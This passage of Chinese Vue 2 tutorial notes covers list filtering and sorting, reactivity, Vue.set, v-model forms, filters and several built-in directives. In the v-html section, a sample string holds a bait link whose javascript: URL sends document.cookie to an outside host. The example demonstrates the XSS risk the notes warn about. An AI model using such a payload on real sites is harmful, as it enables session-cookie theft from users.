		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```

###  11.4  列表排序

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						// 过滤
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```

## 12. `vue`监测数据的原理

###  12.1  数据更新问题

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>更新时的一个问题</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<button @click="updateMei">更新马冬梅的信息</button>
			<ul>
				<li v-for="(p,index) of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			const vm = new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				methods: {
					updateMei(){
						// this.persons[0].name = '马老师' //奏效
						// this.persons[0].age = 50 //奏效
						// this.persons[0].sex = '男' //奏效
						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
					}
				}
			}) 

		</script>
</html>
```

###  12.2  vue监测数据的原理

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35}
					]
				}
			}
		})
	</script>
</html>
```

###  12.3  模拟数据监测

7.模拟一个数据监测.html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
	</head>
	<body>
		<script type="text/javascript" >

			let data = {
				name:'尚硅谷',
				address:'北京',
			}

			//创建一个监视的实例对象，用于监视data中属性的变化
			const obs = new Observer(data)		
			console.log(obs)	

			//准备一个vm实例对象
			let vm = {}
			vm._data = data = obs

			function Observer(obj){
				//汇总对象中所有的属性形成一个数组
				const keys = Object.keys(obj)
				//遍历
				keys.forEach((k)=>{
					Object.defineProperty(this,k,{
						get(){
							return obj[k]
						},
						set(val){
							console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
							obj[k] = val
						}
					})
				})
			}
		</script>
	</body>
</html>
```

###  12.4  Vue.set的使用

使用Vue.set给对象新增属性：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器 -->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```

使用Vue.set修改数组的某个索引值

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理_数组</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>爱好</h2>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```

**Vue.set 的作用**：在Vue 中，尤其是 Vue 2.x 版本，有时候直接给对象新增属性或直接修改数组的某个索引值，视图却不会更新。这是因为 Vue 不能检测对象属性的添加或删除，以及数组通过索引直接设置元素的操作。这时，`Vue.set` 方法就变得非常有用了。`Vue.set` 是 Vue 提供的一个全局方法，它允许向响应式对象添加一个属性，并确保这个新属性也是响应式的，能够触发视图更新。同样的，对于数组，如果使用 `Vue.set` 来修改或添加数组元素，那么这个修改也是响应式的，能够触发视图更新

**`Vue.set` 接收三个参数**：

- **目标对象** (Object/Array)：需要添加属性的对象或需要修改的数组
- **键名/索引** (String/Number)：对象的键名或数组的索引
- **值** (any)：设置的新值
- 对于**对象**，使用 `Vue.set` 的例子如下：

```javascript
<!-- someObject 对象会新增一个名为 newKey的属性，其值为 'newValue' -->
<!-- 如果这个对象已经是响应式的，那么添加新属性后也会自动成为响应式，视图也会相应更新 -->
Vue.set(this.someObject, 'newKey', 'newValue');

<!-- 对于数组，如果你想要插入或修改某个位置的元素，可以这样做 -->
<!-- 这样就会把 someArray 数组索引为 1 的元素设置为 newValue -->
<!-- 如果使用普通的方式如 this.someArray[1] = 'newValue'，则不一定能触发视图更新 -->
Vue.set(this.someArray, 1, 'newValue');
```

**Vue 3 中的响应式更新**：在 Vue 3 中，由于引入了基于 Proxy 的响应式系统，通常情况下直接设置对象的新属性或修改数组的索引值就可以触发视图更新，因此 `Vue.set` 方法不再是必需的。对于 Vue 3，如果需要手动处理响应式更新，通常是使用 `reactive` 或 `ref` 以及它们的相关API来实现，这些方法提供了更自然和灵活的方式来处理响应式数据

###  12.5  vue数据监测总结

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!--
			Vue监视数据的原理：
				1. vue会监视data中所有层次的数据。

				2. 如何监测对象中的数据？
								通过setter实现监视，且要在new Vue时就传入要监测的数据。
									(1).对象中后追加的属性，Vue默认不做响应式处理
									(2).如需给后添加的属性做响应式，请使用如下API：
													Vue.set(target，propertyName/index，value) 或 
													vm.$set(target，propertyName/index，value)

				3. 如何监测数组中的数据？
									通过包裹数组更新元素的方法实现，本质就是做了两件事：
										(1).调用原生对应的方法对数组进行更新。
										(2).重新解析模板，进而更新页面。

				4.在Vue修改数组中的某个元素一定要用如下方法：
							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
							2.Vue.set() 或 vm.$set()
				
				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

##  13. 收集表单数据

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			收集表单数据：
					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
					若：<input type="checkbox"/>
							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
							2.配置input的value属性:
									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
					备注：v-model的三个修饰符：
									lazy：失去焦点再收集数据
									number：输入字符串转为有效的数字
									trim：输入首尾空格过滤
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

**收集表单数据**：在Vue中收集表单数据是一个非常常见且关键的功能，主要依靠Vue的双向数据绑定特性`v-model`来实现。`v-model`能够在表单控件元素上创建数据的双向绑定：视图(UI)的改变能实时更新到数据模型中，数据模型的变化也能立即反映到视图上

**文本框的使用**：

```html
<!--  通过一个文本输入框来收集用户的名字  -->
<div id="app">
  <form @submit.prevent="submitForm">
    <input v-model="name" placeholder="Enter your name">
    <button type="submit">Submit</button>
  </form>
  <p>Submitted Name: {{ submittedName }}</p>
</div>
<!-- v-model="name"创建一个双向绑定在input元素和Vue实例的data对象中的name属性上  -->
<!-- 当用户输入数据时，name属性的值会实时更新。当用户提交表单时，submitForm方法会被触发，然后更新submittedName以显示提交的名字 -->
```

```javascript
// Vue实例 
new Vue({
  el: '#app',
  data: {
    name: '', // 绑定到输入框的数据
    submittedName: '' // 用于存储提交的名字
  },
  methods: {
    submitForm() {
      this.submittedName = this.name; // 当表单提交时更新submittedName
    }
  }
});
```

**复选框的使用**：当涉及到复选框时，Vue处理起来也非常灵活。例如，如果有一个表单，允许用户选择他们感兴趣的话题

```html
<div id="app">
  <form @submit.prevent="submitForm">
    <label>
      <input type="checkbox" v-model="selectedTopics" value="Technology">
      Technology
    </label>
    <label>
      <input type="checkbox" v-model="selectedTopics" value="Science">
      Science
    </label>
    <label>
      <input type="checkbox" v-model="selectedTopics" value="Music">
      Music
    </label>

    <button type="submit">Submit</button>
  </form>
  <p>Selected Topics: {{ selectedTopics.join(', ') }}</p>
</div>
<!-- 在这个示例中，每个input元素都使用了v-model="selectedTopics"，并且每个都有一个不同的value  -->
<!-- 当用户选中或取消选中某个复选框时，selectedTopics数组将相应地被更新。提交表单后，将会弹出一个包含所有选中话题的警告框  -->
```

```javascript
// Vue实例
new Vue({
  el: '#app',
  data: {
    selectedTopics: [] // 选中的话题将会被添加到这个数组中
  },
  methods: {
    submitForm() {
      alert("Selected Topics: " + this.selectedTopics.join(', '));
    }
  }
});
```

**使用单选按钮**：对于单选按钮，`v-model`也是绑定到每个单选按钮上，但所有的单选按钮都应该绑定到同一个数据属性上

```html
<div id="app">
  <form @submit.prevent="submitForm">
    <label>
      <input type="radio" v-model="selectedOption" value="Option 1">
      Option 1
    </label>
    <label>
      <input type="radio" v-model="selectedOption" value="Option 2">
      Option 2
    </label>

    <button type="submit">Submit</button>
  </form>
  <p>Selected Option: {{ selectedOption }}</p>
</div>
<!-- 在这个例子中，两个单选按钮都绑定了selectedOption -->
<!-- 当用户选择不同的选项时，selectedOption的值将会更新为相应的value  -->
<!-- 提交表单将弹出一个警告框，显示选中的选项  -->
```

```javascript
new Vue({
  el: '#app',
  data: {
    selectedOption: '' // 用户选中的选项
  },
  methods: {
    submitForm() {
      alert("Selected Option: " + this.selectedOption);
    }
  }
});
```

**总结**：`v-model`指令使得在Vue应用中收集和处理表单数据变得异常简单和高效。无论是文本输入、复选框还是单选按钮，`v-model`都能够提供一种简洁的方式来实现数据的双向绑定，让开发者能够轻松地收集和利用用户输入的数据

## 14. 过滤器

```
1.过滤器功能:   对要显示的数据进行特定格式化后再显示
2.注意:        并没有改变原本的数据,是产生新的对应的数据
```



```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 
			过滤器：
				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
				语法：
						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
				备注：
						1.过滤器也可以接收额外参数、多个过滤器也可以串联
						2.并没有改变原本的数据, 是产生新的对应的数据
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```

**过滤器**：在 Vue.js 中，过滤器（Filters）是一些特殊的函数，用于对文本的格式进行处理和转换。在 Vue 2.x 版本中，过滤器可以在模板中使用，非常适合处理一些简单的文本转换，比如日期格式化、货币格式化等。但需要注意的是，在 Vue 3.x 中，过滤器已经被移除，官方推荐使用计算属性（Computed properties）或者方法（Methods）来替代过滤器的功能。尽管 Vue 3 中已经不再支持过滤器，但理解 Vue 2 中过滤器的概念和用法对于学习 Vue 的历史版本或维护旧项目仍然有价值

**过滤器的基本用法**：在 Vue 2.x 中，过滤器可以被添加到双花括号插值和 `v-bind` 表达式中，过滤器应该被添加在 JavaScript 表达式的尾部，由一个“管道”符号（`|`）指示

**全局过滤器**：Vue 允许定义全局过滤器，一旦定义，它可以在任何组件的模板中使用

```javascript
Vue.filter('capitalize', function (value) {
  if (!value) return '';
  value = value.toString();
  return value.charAt(0).toUpperCase() + value.slice(1);
});
```

```html
<!-- 使用方法 -->
<p>{{ message | capitalize }}</p>
```

**局部过滤器**：也可以在组件中定义局部过滤器，只能在该组件的模板中使用

```javascript
new Vue({
  // ...
  filters: {
    capitalize: function (value) {
      if (!value) return '';
      value = value.toString();
      return value.charAt(0).toUpperCase() + value.slice(1);
    }
  }
});
```

**过滤器案例**：考虑一个简单的 Vue 应用，其中包含一个用户列表，想要将用户的名字首字母大写，并格式化显示日期

```javascript
new Vue({
  el: '#app',
  data: {
    users: [
      { name: 'alice', registeredAt: 1627849023000 },
      { name: 'bob', registeredAt: 1627935423000 },
    ]
  },
  filters: {
    capitalize: function (value) {
      if (!value) return '';
      value = value.toString();
      return value.charAt(0).toUpperCase() + value.slice(1);
    },
    formatDate: function (value) {
      if (!value) return '';
      let date = new Date(value);
      return date.toLocaleDateString();
    }
  }
});
```

```html
<!-- 在HTML模板中使用过滤器 -->
<div id="app">
  <ul>
    <li v-for="user in users">
      {{ user.name | capitalize }} - {{ user.registeredAt | formatDate }}
    </li>
  </ul>
</div>
```

这个例子中定义了两个过滤器：`capitalize` 和 `formatDate`。`capitalize` 过滤器将用户的名字首字母大写，而 `formatDate` 过滤器将注册时间戳转换为更易读的日期格式。通过在模板中使用这些过滤器，可以轻松地格式化显示数据，而不必在 JavaScript 逻辑中处理字符串和日期格式化，使得代码更加清晰和简洁。尽管在 Vue 3 中过滤器已经不被推荐使用，了解它们的工作原理和应用场景对于深入理解 Vue 的模板语法仍然有帮助。在 Vue 3 中可以通过计算属性或方法来实现相同的功能

##  15. 内置指令 & 自定义指令

###  15.1 v-text指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
				v-text指令：
						1.作用：向其所在的节点中渲染文本内容。
						2.与插值语法{{}}的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

###  15.2  v-html指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```



![image-20240404183638768](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122358769.png)



**v-html指令**：`v-html` 指令用于将字符串渲染为 HTML。它会把绑定的字符串值当作 HTML 来处理，然后将其插入到元素内部。这对于从数据库或者用户输入中动态渲染 HTML 内容非常有用。但是，使用 `v-html` 可能会导致跨站脚本攻击（XSS），因此在处理用户输入时必须格外小心。

**基本用法**：在 Vue 组件的模板中，可以这样使用 `v-html`：

```html
<!-- rawHtml是一个包含 HTML 内容的字符串。Vue 会将其解析并作为 HTML 插入到 div 元素中 -->
<div v-html="rawHtml"></div>
```

```javascript
// 假设有一个 Vue 组件，其中的 data函数返回一个对象，这个对象包含一个 rawHtml字段
// 使用 v-html，这段 HTML 会被正确渲染，显示为红色的文本
data() {
  return {
    rawHtml: '<span style="color: red;">这是红色文本</span>'
  }
}
```

**安全考虑**：由于 `v-html` 直接将字符串作为 HTML 渲染，因此如果这个字符串来自用户输入或其他不可控的来源，它可能包含恶意脚本。如果不加以处理，这些脚本将在你的网页上执行，可能导致 XSS 攻击。为了防范这种风险：

- 尽可能避免使用 `v-html` 来处理用户输入的内容
- 如果必须使用，确保对内容进行适当的清理和转义，以去除潜在的恶意脚本。可以使用一些专门的库，如 DOMPurify，来帮助清理 HTML 内容

###  15.3 v-cloak指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出插值{{xxx}}的问题。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

**`v-cloak` 指令**：`v-cloak` 指令用于在 Vue 应用加载和解析完毕之前，防止未编译的 Mustache 标签（例如 `{{ message }}`）被显示出来。这是为了避免在 Vue 实例完全加载和解析之前，用户看到闪烁的未处理的模板表达式，从而提高应用的用户体验。使用 `v-cloak` 非常简单。只需要在Vue 应用的根元素（或者任何其他元素）上添加 `v-cloak` 属性。然后，在 CSS 中定义一个 `[v-cloak]` 选择器，通常是用来隐藏带有 `v-cloak` 属性的元素，直到 Vue 处理完这些元素为止。一旦 Vue 完成初始化并且对模板进行了编译，`v-cloak` 属性会被自动移除，CSS 规则随之失效，元素就会被显示出来

**`v-cloak`的使用** ：

- **在元素上添加 `v-cloak`：** 在你HTML 标记中，找到一个合适的元素（通常是包裹你的 Vue 应用的元素）并给它添加 `v-cloak` 属性

```html
<div id="app" v-cloak>
  {{ message }}
</div>
```

- **通过 CSS 隐藏带有 `v-cloak` 的元素：** 在样式表中或者 `<style>` 标签中，添加一个针对 `[v-cloak]` 的规则来隐藏这些元素。这样配置之后，在 Vue 应用的 JavaScript 文件加载和执行完成之前，包含 `{{ message }}` 的元素不会被显示出来。一旦 Vue 实例化完成，`v-cloak` 属性被移除，CSS 规则不再适用，元素就会显示出来，展示正确的数据

```css
[v-cloak] {
  display: none;
}
```

**优点**：

- **改善用户体验：** 避免了应用加载时显示原始的花括号表达式
- **简单易用：** 只需要很少的代码改动就能实现

**注意事项**：

- 确保你的 CSS 规则是可访问的，并且在页面加载时就已经加载，这样才能确保 `v-cloak` 正确工作
- `v-cloak` 主要用于改善应用加载时的用户体验，并不会影响 Vue 应用的功能性

###  15.4 v-once指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

